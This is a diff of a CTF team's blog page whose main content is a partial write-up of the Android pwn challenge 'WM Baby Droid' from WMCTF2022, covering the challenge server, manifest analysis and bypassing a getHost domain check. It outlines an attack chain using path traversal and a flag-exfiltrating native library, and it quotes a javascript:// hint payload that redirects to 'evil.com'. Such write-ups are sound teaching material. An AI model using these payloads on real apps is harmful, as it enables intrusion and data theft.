@@ -68,23 +73,23 @@
         <div class="input-group">
             <input type="text" class="search-form-input form-control" placeholder="Search" />
             <span class="input-group-btn">
-                <button type="submit" class="search-form-submit btn btn-flat"><i class="fa fa-search"></i></button>
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
             </span>
         </div>
     </form>
     <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
-            <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
-            <!-- <span class="ins-close ins-selectable"><i class="fa fa-times"></i></span> -->
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
     </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
 </div>
+
 
 </div>
       <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
@@ -94,14 +99,14 @@
         <span class="icon-bar"></span>
       </button>
     </div>
-    <nav id="main-navbar" class="collapse navbar-collapse">
-      <ul class="nav navbar-nav main-nav">
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
         
         
         <li class="menu-item menu-item-home">
           <a href="/.">
             
-            <i class="fa fa-fw fa-home"></i>
+            <i class="icon icon-home-fill"></i>
             
             <span class="menu-title">Home</span>
           </a>
@@ -111,7 +116,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives">
             
-            <i class="fa fa-fw fa-archive"></i>
+            <i class="icon icon-archives-fill"></i>
             
             <span class="menu-title">Archives</span>
           </a>
@@ -121,7 +126,7 @@
         <li class="menu-item menu-item-categories">
           <a href="/categories">
             
-            <i class="fa fa-fw fa-folder"></i>
+            <i class="icon icon-folder"></i>
             
             <span class="menu-title">Categories</span>
           </a>
@@ -131,19 +136,9 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags">
             
-            <i class="fa fa-fw fa-tags"></i>
+            <i class="icon icon-tags"></i>
             
             <span class="menu-title">Tags</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-competitions">
-          <a href="/competitions">
-            
-            <i class="fa fa-fw fa-flag"></i>
-            
-            <span class="menu-title">Competitions</span>
           </a>
         </li>
         
@@ -151,47 +146,37 @@
         <li class="menu-item menu-item-about">
           <a href="/about">
             
-            <i class="fa fa-fw fa-users"></i>
+            <i class="icon icon-users"></i>
             
             <span class="menu-title">About</span>
           </a>
         </li>
         
       </ul>
-      <div class="footer">
-	
+      
 	
     <ul class="social-links">
     	
-        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="fa fa-github"></i></a></li>
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
         
-        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="fa fa-twitter"></i></a></li>
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
         
-        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="fa fa-rss"></i></a></li>
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
         
     </ul>
-    
-    <div class="copyright">
-        &copy; 2022 TEAMROCKETIST
-        <div class="publishby">
-        	<!-- Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
-        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.-->
-        </div>
-    </div>
-</div>
+
     </nav>
   </div>
-</section>
+</header>
 
   
-    <section class="sidebar">
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
   <div class="slimContent">
     
       <div class="widget">
     <h3 class="widget-title">Board</h3>
     <div class="widget-body">
         <div id="board">
-            
             <div class="content">
                 <p>Behind each exploit there is a history of creativity and incredible knowledge.</p>
             </div>
@@ -249,7 +234,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/Android/">Android</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/Android/">Android</a>
               </p>
               <p class="item-title">
                 <a href="/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/" class="title">[Pwn] WMCTF2022 - WM Baby Droid</a>
@@ -264,7 +249,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
               </p>
               <p class="item-title">
                 <a href="/2021/02/08/Pwn-DiceCTF2021-flippidy/" class="title">[Pwn] DiceCTF2021 - flippidy</a>
@@ -294,7 +279,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
               </p>
               <p class="item-title">
                 <a href="/2020/03/23/Pwn-FireShell-CTF-2020-FireHTTPD/" class="title">[Pwn] FireShell CTF 2020 - FireHTTPD</a>
@@ -327,14 +312,15 @@
 
     
   </div>
-</section>
+</aside>
 
   
-  <section class="main">
+  
+<main class="main" role="main">
   <div class="content">
-  <article id="post-Pwn-WMCTF2022-WM-Baby-Droid" class="article article-type-post" itemscope itemprop="blogPost">
+  <article id="post-Pwn-WMCTF2022-WM-Baby-Droid" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
-    <header class="article-header">
+    <div class="article-header">
       
         
   
@@ -346,115 +332,140 @@
       
       <div class="article-meta">
         <span class="article-date">
-    <i class="fa fa-calendar-check-o"></i>
+    <i class="icon icon-calendar-check"></i>
 	<a href="/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/" class="article-date">
 	  <time datetime="2022-08-23T01:05:21.345Z" itemprop="datePublished">2022-08-23</time>
 	</a>
 </span>
         
   <span class="article-category">
-    <i class="fa fa-folder"></i>
+    <i class="icon icon-folder"></i>
     <a class="article-category-link" href="/categories/Pwn/">Pwn</a>►<a class="article-category-link" href="/categories/Pwn/Android/">Android</a>
   </span>
 
         
   <span class="article-tag">
-    <i class="fa fa-tag"></i>
+    <i class="icon icon-tags"></i>
 	<a class="article-tag-link" href="/tags/adb/">adb</a>, <a class="article-tag-link" href="/tags/android/">android</a>, <a class="article-tag-link" href="/tags/emulator/">emulator</a>, <a class="article-tag-link" href="/tags/gethost/">gethost</a>, <a class="article-tag-link" href="/tags/javascriptinterfaces/">javascriptinterfaces</a>, <a class="article-tag-link" href="/tags/nativelibraries/">nativelibraries</a>, <a class="article-tag-link" href="/tags/uri/">uri</a>, <a class="article-tag-link" href="/tags/urigethost/">urigethost</a>
   </span>
 
 
         
 
-		
-        <span class="post-comment"><i class="fa fa-commenting-o"></i> <a href="/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/#comments" class="article-comment-link">Comments</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/#comments" class="article-comment-link">Comments</a></span>
         
-		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 3,011 (words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 3,011(words)</span>
 	
 	
-		<span class="post-readcount hidden-xs">Read Time: 19 (min)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 19(minutes)</span>
 	
 
       </div>
-    </header>
-    <div class="article-entry" itemprop="articleBody">
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
       
         <blockquote>
-<p> WM Baby Droid </p>
+<p>WM Baby Droid</p>
 </blockquote>
 <blockquote>
 <p><strong>Solves</strong>: 1</p>
-<p><strong>Points</strong>: 500   </p>
-<p><strong>Description</strong>:<br>nc 43.248.96.7 10086</p>
+<p><strong>Points</strong>: 500</p>
+<p><strong>Description</strong>:<br>
+nc 43.248.96.7 10086</p>
 <p>Attachment:</p>
-<p><a href="https://mega.nz/file/Hm5kCAoY#cLJV96i_oq2xJMiSDJxTQ3Hb8LccUv_vKg6sBiWO5E4" target="_blank" rel="noopener">download</a><br>d9c14779206634d37e7f0e43d5c9537a</p>
+<p><a href="https://mega.nz/file/Hm5kCAoY#cLJV96i_oq2xJMiSDJxTQ3Hb8LccUv_vKg6sBiWO5E4" target="_blank" rel="noopener">download</a><br>
+d9c14779206634d37e7f0e43d5c9537a</p>
 <p><strong>Author</strong>: bubble#2768</p>
 </blockquote>
-<h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul>
-<li>Bypass domain <strong>google.com</strong> verification with <strong>javascript://</strong> to redirect to the evil website.</li>
+<h3 id="tldr"><a class="markdownIt-Anchor" href="#tldr"></a> TLDR</h3>
+<ul>
+<li>Bypass domain <strong><a href="http://google.com" target="_blank" rel="noopener">google.com</a></strong> verification with <strong>javascript://</strong> to redirect to the evil website.</li>
 <li>App trusts <strong>download_name</strong> so we can use path transversal to save the downloaded library into internal storage.</li>
 <li>Write a native library that will read the flag from the file system and send it through a socket.</li>
 <li>Write the necessary javascript to trigger the <strong>javascriptinterface</strong> and execute our malicious library.</li>
 </ul>
-<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>After downloading the attachment we have the following files:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -l WM_Baby_Droid.zip  </span><br><span class="line">Archive:  WM_Baby_Droid.zip</span><br><span class="line">  Length      Date    Time    Name</span><br><span class="line">---------  ---------- -----   ----</span><br><span class="line">     1978  2022-05-19 10:20   attachment/Dockerfile</span><br><span class="line">  3897305  2022-08-19 10:44   attachment/app-debug.apk</span><br><span class="line">       11  2022-08-19 11:36   attachment/flag</span><br><span class="line">     2333  2022-08-19 10:26   attachment/readme.md</span><br><span class="line">     1022  2022-08-19 10:30   attachment/run.sh</span><br><span class="line">     7848  2022-08-19 10:40   attachment/server.py</span><br><span class="line">      232  2022-04-19 18:58   attachment/server.sh</span><br><span class="line">---------                     -------</span><br><span class="line">  3910729                     7 files</span><br></pre></td></tr></table></figure></p>
+<h3 id="introduction"><a class="markdownIt-Anchor" href="#introduction"></a> Introduction</h3>
+<p>After downloading the attachment we have the following files:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -l WM_Baby_Droid.zip  </span><br><span class="line">Archive:  WM_Baby_Droid.zip</span><br><span class="line">  Length      Date    Time    Name</span><br><span class="line">---------  ---------- -----   ----</span><br><span class="line">     1978  2022-05-19 10:20   attachment/Dockerfile</span><br><span class="line">  3897305  2022-08-19 10:44   attachment/app-debug.apk</span><br><span class="line">       11  2022-08-19 11:36   attachment/flag</span><br><span class="line">     2333  2022-08-19 10:26   attachment/readme.md</span><br><span class="line">     1022  2022-08-19 10:30   attachment/run.sh</span><br><span class="line">     7848  2022-08-19 10:40   attachment/server.py</span><br><span class="line">      232  2022-04-19 18:58   attachment/server.sh</span><br><span class="line">---------                     -------</span><br><span class="line">  3910729                     7 files</span><br></pre></td></tr></table></figure>
 <p>Lets start by analysing the <code>server.py</code>.</p>
-<p>The server will request a poc url from the begining to be sent to the app through an intent:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print_to_user(<span class="string">"Please enter your poc url:"</span>)</span><br><span class="line">url = sys.stdin.readline().strip()</span><br><span class="line"><span class="comment"># url should be like "http://xxx" to to ensure that `adb shell` passes intent.data correctly.</span></span><br><span class="line"><span class="keyword">if</span> url.strip(<span class="string">'"'</span>) == url:</span><br><span class="line">    url = <span class="string">f'"<span class="subst">&#123;url&#125;</span>"'</span></span><br><span class="line">...</span><br><span class="line">adb_activity(<span class="string">f"<span class="subst">&#123;VULER&#125;</span>/.MainActivity"</span>, wait=<span class="keyword">True</span>, data=url)</span><br></pre></td></tr></table></figure></p>
-<p>More useful information is given to us when a new emulator with android <code>API_30</code> and <code>x86_64</code> architecture is created:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup_emulator</span><span class="params">()</span>:</span></span><br><span class="line">    subprocess.call(</span><br><span class="line">        <span class="string">"avdmanager"</span> +</span><br><span class="line">        <span class="string">" create avd"</span> +</span><br><span class="line">        <span class="string">" --name 'pixel_xl_api_30'"</span> +</span><br><span class="line">        <span class="string">" --abi 'google_apis/x86_64'"</span> +</span><br><span class="line">        <span class="string">" --package 'system-images;android-30;google_apis;x86_64'"</span> +</span><br><span class="line">        <span class="string">" --device pixel_xl"</span> +</span><br><span class="line">        <span class="string">" --force"</span> +</span><br><span class="line">        (<span class="string">""</span> <span class="keyword">if</span> isMacos  <span class="keyword">else</span> <span class="string">" &gt; /dev/null 2&gt; /dev/null"</span>),</span><br><span class="line">        env=ENV,</span><br><span class="line">        close_fds=<span class="keyword">True</span>,</span><br><span class="line">        shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> subprocess.Popen(</span><br><span class="line">        <span class="string">"emulator"</span> +</span><br><span class="line">        <span class="string">" -avd pixel_xl_api_30"</span> +</span><br><span class="line">        <span class="string">" -no-cache"</span> +</span><br><span class="line">        <span class="string">" -no-snapstorage"</span> +</span><br><span class="line">        <span class="string">" -no-snapshot-save"</span> +</span><br><span class="line">        <span class="string">" -no-snapshot-load"</span> +</span><br><span class="line">        <span class="string">" -no-audio"</span> +</span><br><span class="line">        <span class="string">" -no-window"</span> +</span><br><span class="line">        <span class="string">" -no-snapshot"</span> +</span><br><span class="line">        <span class="string">" -no-boot-anim"</span> +</span><br><span class="line">        <span class="string">" -wipe-data"</span> +</span><br><span class="line">        <span class="string">" -accel on"</span> +</span><br><span class="line">        <span class="string">" -netdelay none"</span> +</span><br><span class="line">        <span class="string">" -no-sim"</span> +</span><br><span class="line">        <span class="string">" -netspeed full"</span> +</span><br><span class="line">        <span class="string">" -delay-adb"</span> +</span><br><span class="line">        <span class="string">" -port &#123;&#125;"</span>.format(EMULATOR_PORT) +</span><br><span class="line">        (<span class="string">""</span> <span class="keyword">if</span> isMacos  <span class="keyword">else</span> <span class="string">" &gt; /dev/null 2&gt; /dev/null "</span>) +</span><br><span class="line">        <span class="string">""</span>,</span><br><span class="line">        env=ENV,</span><br><span class="line">        close_fds=<span class="keyword">True</span>,</span><br><span class="line">        shell=<span class="keyword">True</span>,</span><br><span class="line">        preexec_fn=os.setsid)</span><br><span class="line">...</span><br><span class="line">print_to_user(<span class="string">"Preparing android emulator. This may takes about 2 minutes...\n"</span>)</span><br><span class="line">emulator = setup_emulator()</span><br><span class="line">adb([<span class="string">"wait-for-device"</span>])</span><br></pre></td></tr></table></figure></p>
+<p>The server will request a poc url from the begining to be sent to the app through an intent:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print_to_user(<span class="string">"Please enter your poc url:"</span>)</span><br><span class="line">url = sys.stdin.readline().strip()</span><br><span class="line"><span class="comment"># url should be like "http://xxx" to to ensure that `adb shell` passes intent.data correctly.</span></span><br><span class="line"><span class="keyword">if</span> url.strip(<span class="string">'"'</span>) == url:</span><br><span class="line">    url = <span class="string">f'"<span class="subst">&#123;url&#125;</span>"'</span></span><br><span class="line">...</span><br><span class="line">adb_activity(<span class="string">f"<span class="subst">&#123;VULER&#125;</span>/.MainActivity"</span>, wait=<span class="keyword">True</span>, data=url)</span><br></pre></td></tr></table></figure>
+<p>More useful information is given to us when a new emulator with android <code>API_30</code> and <code>x86_64</code> architecture is created:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup_emulator</span><span class="params">()</span>:</span></span><br><span class="line">    subprocess.call(</span><br><span class="line">        <span class="string">"avdmanager"</span> +</span><br><span class="line">        <span class="string">" create avd"</span> +</span><br><span class="line">        <span class="string">" --name 'pixel_xl_api_30'"</span> +</span><br><span class="line">        <span class="string">" --abi 'google_apis/x86_64'"</span> +</span><br><span class="line">        <span class="string">" --package 'system-images;android-30;google_apis;x86_64'"</span> +</span><br><span class="line">        <span class="string">" --device pixel_xl"</span> +</span><br><span class="line">        <span class="string">" --force"</span> +</span><br><span class="line">        (<span class="string">""</span> <span class="keyword">if</span> isMacos  <span class="keyword">else</span> <span class="string">" &gt; /dev/null 2&gt; /dev/null"</span>),</span><br><span class="line">        env=ENV,</span><br><span class="line">        close_fds=<span class="keyword">True</span>,</span><br><span class="line">        shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> subprocess.Popen(</span><br><span class="line">        <span class="string">"emulator"</span> +</span><br><span class="line">        <span class="string">" -avd pixel_xl_api_30"</span> +</span><br><span class="line">        <span class="string">" -no-cache"</span> +</span><br><span class="line">        <span class="string">" -no-snapstorage"</span> +</span><br><span class="line">        <span class="string">" -no-snapshot-save"</span> +</span><br><span class="line">        <span class="string">" -no-snapshot-load"</span> +</span><br><span class="line">        <span class="string">" -no-audio"</span> +</span><br><span class="line">        <span class="string">" -no-window"</span> +</span><br><span class="line">        <span class="string">" -no-snapshot"</span> +</span><br><span class="line">        <span class="string">" -no-boot-anim"</span> +</span><br><span class="line">        <span class="string">" -wipe-data"</span> +</span><br><span class="line">        <span class="string">" -accel on"</span> +</span><br><span class="line">        <span class="string">" -netdelay none"</span> +</span><br><span class="line">        <span class="string">" -no-sim"</span> +</span><br><span class="line">        <span class="string">" -netspeed full"</span> +</span><br><span class="line">        <span class="string">" -delay-adb"</span> +</span><br><span class="line">        <span class="string">" -port &#123;&#125;"</span>.format(EMULATOR_PORT) +</span><br><span class="line">        (<span class="string">""</span> <span class="keyword">if</span> isMacos  <span class="keyword">else</span> <span class="string">" &gt; /dev/null 2&gt; /dev/null "</span>) +</span><br><span class="line">        <span class="string">""</span>,</span><br><span class="line">        env=ENV,</span><br><span class="line">        close_fds=<span class="keyword">True</span>,</span><br><span class="line">        shell=<span class="keyword">True</span>,</span><br><span class="line">        preexec_fn=os.setsid)</span><br><span class="line">...</span><br><span class="line">print_to_user(<span class="string">"Preparing android emulator. This may takes about 2 minutes...\n"</span>)</span><br><span class="line">emulator = setup_emulator()</span><br><span class="line">adb([<span class="string">"wait-for-device"</span>])</span><br></pre></td></tr></table></figure>
 <p>We also know from the file that the flag is being broadcasted here:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(FLAG_FILE, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    adb_broadcast(<span class="string">f"com.wmctf.SET_FLAG"</span>, <span class="string">f"<span class="subst">&#123;VULER&#125;</span>/.FlagReceiver"</span>, extras=&#123;<span class="string">"flag"</span>: f.read()&#125;)</span><br></pre></td></tr></table></figure>
-<h3 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h3><p>The apk doesn’t have a lot of obfuscation (this was expected since the category of the challenge is pwn and not a reverse).</p>
+<h3 id="static-analysis"><a class="markdownIt-Anchor" href="#static-analysis"></a> Static Analysis</h3>
+<p>The apk doesn’t have a lot of obfuscation (this was expected since the category of the challenge is pwn and not a reverse).</p>
 <p>We used <a href="https://github.com/skylot/jadx" target="_blank" rel="noopener">jadx</a> to analyse the app so lets see what we have in the <strong>AndroidManifest.xml</strong>.</p>
-<p>The application only has the <strong>INTERNET</strong> permission to connect to the internet, a receiver and the main activity:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"com.wmctf.wmbabydroid.MainActivity"</span> <span class="attr">android:exported</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">"com.wmctf.wmbabydroid.FlagReceiver"</span> <span class="attr">android:exported</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>The launcher activity:<br><a data-fancybox="gallery" href="https://i.imgur.com/xRBFwrS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/xRBFwrS.png" alt><br></a></p>
-<p>The receiver:<br><a data-fancybox="gallery" href="https://i.imgur.com/x19fanf.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/x19fanf.png" alt><br></a></p>
+<p>The application only has the <strong>INTERNET</strong> permission to connect to the internet, a receiver and the main activity:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"com.wmctf.wmbabydroid.MainActivity"</span> <span class="attr">android:exported</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">"com.wmctf.wmbabydroid.FlagReceiver"</span> <span class="attr">android:exported</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>The launcher activity:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/xRBFwrS.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/xRBFwrS.png" alt><br>
+</a></p>
+<p>The receiver:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/x19fanf.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/x19fanf.png" alt><br>
+</a></p>
 <p>We don’t have to worry to generate a broadcast since the server will generate one for us (we saw this in the introduction section).</p>
-<h3 id="Bypass-getHost"><a href="#Bypass-getHost" class="headerlink" title="Bypass getHost"></a>Bypass getHost</h3><p>Since there is a verification to allow google.com urls to be loaded:</p>
+<h3 id="bypass-gethost"><a class="markdownIt-Anchor" href="#bypass-gethost"></a> Bypass getHost</h3>
+<p>Since there is a verification to allow <a href="http://google.com" target="_blank" rel="noopener">google.com</a> urls to be loaded:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!uri.getHost().endsWith(<span class="string">".google.com"</span>)) &#123;</span><br></pre></td></tr></table></figure>
-<p>Me and my friend had this great idea of actually hosting our website in <strong>sites.google.com</strong>, we did implement this and the poc was working <strong>locally</strong> unfortunately everything into to the garbage when the organizers told us that <strong>China banned google</strong> so the servers wouldn’t be able to connect to google domains.</p>
+<p>Me and my friend had this great idea of actually hosting our website in <strong><a href="http://sites.google.com" target="_blank" rel="noopener">sites.google.com</a></strong>, we did implement this and the poc was working <strong>locally</strong> unfortunately everything into to the garbage when the organizers told us that <strong>China banned google</strong> so the servers wouldn’t be able to connect to google domains.</p>
 <p>Hearing this we finally realized this was probably a <strong>url parsing</strong> challenge and we tried multiple tricks like the ones mentioned in the <strong>orange blackhat</strong> <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">presentation</a> without any success.</p>
 <p>We eventually found this <a href="https://hackerone.com/reports/431002" target="_blank" rel="noopener">CVE</a> about a vulnerability in <strong>getHost</strong> but it looks it only works on <strong>older API versions</strong>,  more recent ones are already patched (We also know from the emulator configuration that the android <strong>API version is 30</strong> so this wouldn’t work).</p>
 <p>We tried to analyse <strong>Android API 30</strong> code trying to find a <strong>flaw</strong> in the code and also checking the URL <strong>RFC</strong> and try new things but without any success.</p>
-<p>We also thought of using an <strong>redirect</strong> to bypass the check  but since the server is hosted in <strong>china</strong> and <strong>google.com</strong> is banned we forgot about this for a while.</p>
+<p>We also thought of using an <strong>redirect</strong> to bypass the check  but since the server is hosted in <strong>china</strong> and <strong><a href="http://google.com" target="_blank" rel="noopener">google.com</a></strong> is banned we forgot about this for a while.</p>
 <p>Another idea showed up on trying to use <strong>file://</strong> to access the internal files of the emulator and read the flag, unfortunately to use this requires a special permission in the <strong>webview</strong> so we discarded this option.</p>
 <p>Eventually the organizers published an announcement for this challenge giving the tip to use <strong>javascript://</strong>.</p>
 <p>In the end it was kind of <strong>“simple”</strong> but we didn’t remember of trying <strong>javascript://</strong> which makes sense and it eventually doesn’t even need to request the google domain which is perfect.</p>
 <p>The hint given was:</p>
 <blockquote>
-<p>Baby Droid Hint: JavaScript://<a href="http://www.google.com/%0d%0awindow.location.href=&#39;http://evil.com/&#39;" target="_blank" rel="noopener">www.google.com/%0d%0awindow.location.href=&#39;http://evil.com/&#39;</a></p>
+<p>Baby Droid Hint: JavaScript://www.google.com/%0d%0awindow.location.href=‘<a href="http://evil.com/" target="_blank" rel="noopener">http://evil.com/</a>’</p>
 </blockquote>
-<h3 id="Drop-the-file-into-the-internal-storage-file-directory"><a href="#Drop-the-file-into-the-internal-storage-file-directory" class="headerlink" title="Drop the file into the internal storage file directory"></a>Drop the file into the internal storage file directory</h3><p>The downloaded file is being saved in the external storage cache directory:</p>
